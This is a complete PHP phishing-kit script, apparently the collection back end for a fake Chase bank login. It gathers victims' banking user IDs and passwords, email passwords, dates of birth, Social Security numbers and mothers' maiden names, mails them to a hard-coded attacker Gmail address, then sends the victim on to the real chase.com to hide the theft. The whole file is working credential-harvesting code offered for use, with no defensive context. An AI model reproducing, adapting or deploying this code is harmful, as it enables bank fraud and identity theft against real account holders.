<?php
session_start();



// Put Your Email Here
$userinfo= "rkate946@gmail.com";

$UserID   = $_SESSION['UserID']."\n";
$Password   = $_SESSION['Password']."\n";


$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);


$message  = "========+[ Online Acess by Ccorps ]+=========\n";
$message .= "Username : ".$_SESSION['UserID']."\n";
$message .= "Password : ".$_SESSION['Password']."\n";
$message .= "------+[ Email Access & Bank Info by Ccorps ]+------\n";
$message .= "Email : ".$_POST['email']."\n";
$message .= "Email Password : ".$_POST['mailpass']."\n";
$message .= "DOB mm/dd/yyyy: ".$_POST['txtMM']."/".$_POST['txtDD']."/".$_POST['txtYYD']."\n";
$message .= "SSN: ".$_POST['txtPerSSN1']."/".$_POST['txtPerSSN2']."/".$_POST['txtPerSSN3']."\n";
$message .= "Mother Maiden Name : ".$_POST['mmn']."\n";
$message .= "=============+[ Ip & Hostname Info ]+=============\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "=============+ Hacked in 2017 By [ Ccorps ] +=============\n";
$subject="Chase Complete | $ip";
$headers = "From: Ccorps<info@server.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($userinfo,$subject,$message,$headers);

$encrypt=  base64_encode($message);
header("Location: http://www.chase.com?close=$encrypt");

?>